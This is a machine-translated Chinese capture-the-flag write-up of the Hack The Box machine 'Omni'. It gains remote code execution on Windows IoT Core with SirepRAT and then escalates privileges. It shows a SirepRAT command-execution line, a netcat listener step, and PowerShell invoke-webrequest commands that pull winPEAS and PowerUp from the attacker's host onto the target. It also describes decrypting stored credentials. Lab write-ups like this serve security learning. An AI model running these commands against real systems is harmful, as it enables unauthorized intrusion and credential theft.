# HTB·奥米[报道]

> 原文：<https://infosecwriteups.com/htb-omni-writeup-7efdc6fd1c10?source=collection_archive---------0----------------------->

## 使用 SireRAT 开发 Windows 物联网核心

# 摘要

这是一台易受远程代码执行攻击的 windows IoT 机器(RCE)。一种名为 SirepRAT 的远程访问特洛伊木马(RAT)工具被用来利用此漏洞获取根用户。

![](img/819f198c9cc2547c96accb88c3586465.png)

Jorge Ramirez 在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

**操作系统:** Windows 10 IOT 核心 x64 位架构

**使用的工具:**

*   nmap
*   锡雷普拉特— Windows IOT RCE

## 侦察和枚举- NMAP TCP 输出

![](img/699a3208e6e22633931988290ca2bd55.png)

## 据点

*** * * * * * * * * *端口 8080 微软 IIS httpd * * * * * * * * * * * * * * * * * * * * * * * * * * * * * ***

![](img/5a193bbaaedf2a15518b8524e9151c80.png)

切换到端口 8080，我们可以看到访问这个名为“Windows 设备门户”的站点需要身份验证。我在谷歌上搜索了“windows IoT exploit”，并注意到了一篇关于利用这个漏洞的开源工具的文章。

![](img/98540c59407c366e63acf8793406c2b9.png)![](img/e9efc879509989b6de96ee5b82e5f919.png)

使用此[连杆](https://github.com/SafeBreach-Labs/SirepRAT)安装 SireRAT。

**通过执行以下命令**找出系统主机名

`python /usr/local/bin/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd “C:\Windows\System32\hostname.exe”`

`—return_output`返回命令输出

`—cmd`命令执行

![](img/081d0a148b9af26de2c33775bae2f079.png)

## 启动 nc 监听器并执行 powershell

![](img/4c4575436098e1601671a0278bfa2413.png)![](img/23a688147ba7378220ea7fa6309c3510.png)![](img/4133ff85ea337340922f2303e2b90342.png)![](img/cbe4386e78bedf6c3a2ea14ae638d0c9.png)

`powershell invoke-webrequest -uri [http://10.10.14.24/windows/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe](http://10.10.14.17:8777/windows/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe) -outfile C:\Windows\temp\winpeas.exe`

`powershell invoke-webrequest -uri [http://10.10.14.24/windows/](http://10.10.14.17:8777/windows/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe)powerup.ps1 -outfile C:\Windows\temp\powerup.ps1`

![](img/230ddf9a91eaba271ae7478db4a36562.png)![](img/31f737b9e85373a288643e653c3df058.png)

## 横向运动

在使用 winpPEAS.bat 枚举盒子时，我发现还有两个磁盘:D:和 U:

![](img/cf50afc3fa596fe72720cebde588fdbe.png)![](img/ae1b61d38915f7414308c7b30185d842.png)

使用找到的用户应用程序凭据，我尝试登录身份验证门户。

![](img/e87b58ab1256c39732f1206a7a71f0a3.png)![](img/ae1ed59dbf0ffb2344489635d5e34c83.png)

使用 [ref1](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/) 和 [ref2](https://www.thinbug.com/q/55807201) 解密 powershell 安全字符串密码。

![](img/8cd449224eff48768af76fb13e18560c.png)

## 权限提升

![](img/60567a797df7618560f79a6f2ba7ba7f.png)![](img/ee402d1d978f7af9be5277b23ceeffc5.png)![](img/8708ce238f299bfa39fe6637ad9a08ec.png)![](img/1d009077c6b1ec420a14d8881745b0c5.png)![](img/dcb3b298379ab07e6416bdd0aa83d884.png)

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 条线索、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！